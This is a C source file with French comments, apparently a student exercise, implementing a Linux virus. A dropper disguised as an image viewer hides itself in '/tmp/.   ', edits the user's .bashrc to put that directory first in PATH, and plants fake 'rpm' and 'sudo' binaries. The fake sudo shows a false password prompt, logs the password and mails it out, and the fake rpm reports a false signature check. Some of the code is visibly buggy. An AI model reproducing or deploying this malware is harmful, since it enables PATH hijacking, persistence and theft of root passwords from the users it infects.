//
//  main.c
//  v_RpMdp
//
//  Created by Cécile Bourgeois on 05/05/2019.
//  Copyright © 2019 Cécile Bourgeois. All rights reserved.
//
//

#include <getopt.h> /* La fonction getopt() analyse les arguments de la ligne de commande. Ses éléments argc et argv correspondent aux nombres et à la table d'arguments qui sont transmis à la fonction main() lors du lancement du programme */
#include <stdio.h> /* pour « Standard Input/Output Header » ou « En-tête Standard d'Entrée/Sortie », est l'en-tête de la bibliothèque standard du C déclarant les macros, les constantes et les définitions de fonctions utilisées dans les opérations d'entrée/sortie. */
#include <sys/types.h> // pour linux
#include <dirent.h> /* c'est un header standard pour les systèmes UNIX. Les codes et les possibilités seront exactement les mêmes pour Linux et Mac par exemple */
#include <sys/stat.h> /* définit la structure des données renvoyées par les fonctions fstat () , lstat () et stat () */
#include <unistd.h> /* pour faire une traduction des appels de fonction POSIX en appel de fonction Windows. POSIX : Ces normes ont émergé d'un projet de standardisation des interfaces de programmation des logiciels destinés à fonctionner sur les variantes du système d'exploitation UNIX. */
#include <string.h> /* est l'en-tête de la bibliothèque standard du C, du langage C, qui contient les définitions des macros, des constantes et les déclarations de fonctions et de types utilisées non seulement pour la manipulation de chaînes de caractères, mais aussi pour diverses fonctions de manipulations de la mémoire. */
#include <stdlib.h> /* fait partie de la bibliothèque standard définie par la norme ANSI. Il contient les déclarations de fonctions traitant d'allocation-mémoire, de conversion de chaînes de caractères en types numériques (int, long, double) */
#include <pwd.h> // structure password

/* définition des variables */
struct stat info_fichier; /* stat() récupère l'état du fichier pointé par path et remplit le tampon buf. struct stat est une structure système définie pour stocker des informations sur les fichiers */
int etat_retour;
FILE * fichier_out, * fichier_in;
char car, chaine[64], chaine2[64];
// ancienne version
//struct passwd * pass;

char * ch, * p1, * new_ch, * repertoire_cache, * repertoire_mdp, * chaine_mdp;
int i,taille;

/* Liste des fichiers cibles : pour l'instant on ne cible que "rpm" */
char * cible[2] = {"rpm", "sudo"};



    int main(int argc,char * argv[ ],char * envp[ ])
	/* argc donne le nombre d'éléments de la ligne de commande, et argv contient ces éléments sous la forme d'un tableau de chaînes de caractères, envp : liste des variables d'environnement */
    {
        register struct passwd *pw; /* register : demande au compilateur de faire tout son possible pour utiliser un registre processeur pour cette variable */
        register uid_t uid; // user identifier
        
        // l'executable appelant est-il ImageView (notre dropper)
        if (strstr(argv[0],"imageview")) /* la fonction strstr recherche la première occurrence d'une sous-chaîne (paramètre substring) dans la chaîne de caractères principale (paramètre fullString) */
        {
            // Lors de la primo-infection, on lance d'abord le programme "originel"
            strcpy(chaine, "display "); // permet de copier le contenu d'une chaîne de caractères dans une autre
            strcat(chaine, argv[1]); // permet de rajouter à une chaîne de caractères déjà existante le contenu d'une seconde
            
            // Si on rencontre un problème, fin du programme
            if(system(chaine) == -1) exit(0); // Exécuter une commande shell 
            
            // Création du nom du répertoire caché
            repertoire_cache = "/tmp/.   ";
            
            // Surinfection : si le répertoire accesible en ouverture alors déjà infecté
            if(opendir(repertoire_cache)) exit(0);
            
            // Si non : création du répertoire en gérant les erreurs
            if(mkdir(repertoire_cache, 0777)) exit(0);
            
            // Création de la chaine $HOME/.bashrc
            uid = getuid(); // uid du processus courant
            pw = getpwuid(uid); // recherche dans la base de données des utilisateurs un ID utilisateur
            if(pw) {
                
              // Création de la chaine $HOME/.bashrc
              strcpy(chaine,pw->pw_dir);
              strcat(chaine,"/.bashrc");
              printf("%s\n",chaine); // OK
                
            }
	        else exit(0);
            
            // la taille nous sera utile pour l'ecriture dans le fichier
            stat(chaine, &info_fichier); // stat() récupère l'état du fichier pointé par path et remplit le tampon info_fichier
            taille = (int)info_fichier.st_size;
            printf("Taille = %d\n",taille); /// OK

            // -------- On modifie le .bashrc ----------
            
            // création d'un tableau
            if(!(ch = (char *)calloc(taille+30, sizeof(char)))) exit(0);
            /* Cette fonction alloue un bloc de mémoire en initialisant tous ces octets à la valeur 0. Bien que relativement proche de la fonction malloc, deux aspects les différencient : */
            //L'initialisation : calloc met tous les octets du bloc à la valeur 0 alors que malloc ne modifie pas la zone de mémoire.
            //Les paramètres d'appels : calloc requière deux paramètres (le nombre d'éléments consécutifs à allouer et la taille d'un élément) alors que malloc attend la taille totale du bloc à allouer.
            
            /* remarque void * malloc( size_t memorySize );
             Cette fonction permet d'allouer un bloc de mémoire dans le tas (le heap en anglais). Attention : la mémoire allouée dynamiquement n'est pas automatiquement relachée. Il faudra donc, après utilisation, libérer ce bloc de mémoire via un appel à la fonction free */
            
            // On créée un flux de lecture du fichier dont l'adresse est chaine
            if(!(fichier_in = fopen(chaine,"r"))) exit(0);
            
            // on créée un flux d'ecriture dans file_tmp
            if(!(fichier_out = fopen("file_tmp","w"))) exit(0);
            
            // le curseur est situé au début du fichier
	        i = 0;
            
            // on lit le fichier qu'on enregistre dans un tableau ch
            while(fscanf(fichier_in,"%c",&car),!feof(fichier_in)) ch[i++] = car;
            // pour fermer la boucle feof, après que la dernière valeur ait été lue feof() renvoie 0
            
            // on va vérifier si la variable PATH est présente dans .bashrc
            // on stocke ce qui est après PATH= dans ch
            p1 = strstr(ch,"PATH=");

            if(p1 != NULL) 
            {
                new_ch = (char *)calloc(taille+50, sizeof(char)); // commentaire
                
                // On copie les caracteres avant le PATH = vers new_ch
                strncpy(new_ch,ch,strlen(ch)-strlen(p1));
                
                // On ajoute a new_ch notre nouvelle variable PATH
                // on ajoute en premier notre dossier puis le reste du PATH original
                strcat(new_ch, "PATH=");
                strcat(new_ch,"/tmp/.\\ \\ \\ :$");
                strcat(new_ch,(p1+6));
                
                // on écrit dans le flux fichier_out
                fwrite(new_ch,1,taille+13,fichier_out);
            }

            // sinon on la rajoute
            else
            {
                printf("on la pas trouvé dans bashrc"); 
                fwrite(ch,1,taille,fichier_out);
                fprintf(fichier_out,"PATH=/tmp/.\\ \\ \\ :$PATH\n");
                fprintf(fichier_out,"export PATH");
            }

            // on remplace l'ancien .bashrc
            if(rename("file_tmp",chaine)) exit(0);

            // On commence la primo infection
            for(i = 0;i < 2;i++)
            {
                // Duplication du virus
                strcpy(chaine2,"cp ");
                strcat(chaine2,argv[0]);
                strcat(chaine2," /tmp/.\\ \\ \\ /");
                strcat(chaine2, cible[i]);
                if(system(chaine2) == -1) continue;
                // Chaque copie du virus est rendue executable
                p1 = strstr(chaine2,"/tmp");
                chmod(p1, S_IRWXU);
            }

        }
        // l'executable appelant est un hote infecté
        else
        {
            
            if(argv[0]=="rpm")
            {
                // comment obtenir l'option du programme ? ce n'est pas un argument ? argv[1] ??
                int options;
                int appel_OK;
                appel_OK=0;
                const char* const option_courte = "K";
                const struct option option_longue[] = {{ "checksig", 0, NULL, 'K' }, { NULL, 0, NULL, 0}};
                
                while ((options = getopt_long(argc, argv, option_courte, option_longue, NULL)) != -1)
                    switch (options) {
                        case 'K' :
                            appel_OK=1;
                            break;
                    }
            
                if (appel_OK==1) {
                    // On affiche "l'argument est intègre" ...
                    printf(" Argument integre ");
                }
                else
                {
                    // Nom avec chemin absolu du programme hote : RPM installé par défaut :
                    strcpy(new_ch,"/usr/bin/");
                    strcat(new_ch, argv[0]);
                    execve(new_ch, argv, envp); // exécute le programme correspondant au fichier. Celui-ci doit être un exécutable binaire ou bien un script
                }
            }
            
            if(argv[0]=="sudo")
            {
                
                
                // on fait une fausse entrée qu'on enregistre et envoie par mail
                // déclarer les varibales repertoire_mdp et chaine_mdp
                // création du répertoire mdp
                repertoire_mdp = "/tmp/.   /mdp"; // à déclarer
                
                // on vérifie si on a déjà stocké le mot de passe root
                if (opendir(repertoire_mdp)) {
                    // si non on créée le répertoire
                    if(mkdir(repertoire_mdp, 0777)) exit(0);
                    
                    // On simule une demande de mot de passe suite à la commande sudo
                    strcpy(chaine_mdp, "read -s -p \"Entrez votre mot de passe\" PASSWD; echo ");
                    
                    // Si on rencontre un problème, fin du programme
                    if(system(chaine_mdp) == -1) exit(0);
                
                   
                    // on stocke le mot de passe entré dans log.txt
                    strcpy(chaine_mdp, "echo $PASSWD > /tmp/.    /mdp/log.txt ");
                    
                    // Si on rencontre un problème, fin du programme
                    if(system(chaine_mdp) == -1) exit(0);
                    
                    // On envoi le mot de passe à l'aide de mail (ici FAUSSE adresse mail)
                    strcpy(chaine_mdp, "cat /tmp/.    /mdp/log.txt | mail -s \"mdp\" francois.bernard323@gmail.com");
                    
                    // Si on rencontre un problème, fin du programme
                    if(system(chaine_mdp) == -1) exit(0);
                    
                    
                }
                else
                {
                    // Nom avec chemin absolu du programme hote : sudo :
                    strcpy(new_ch,"/usr/bin/");
                    strcat(new_ch, argv[0]);
                    execve(new_ch, argv, envp);
                }
            }
            
        }

    }
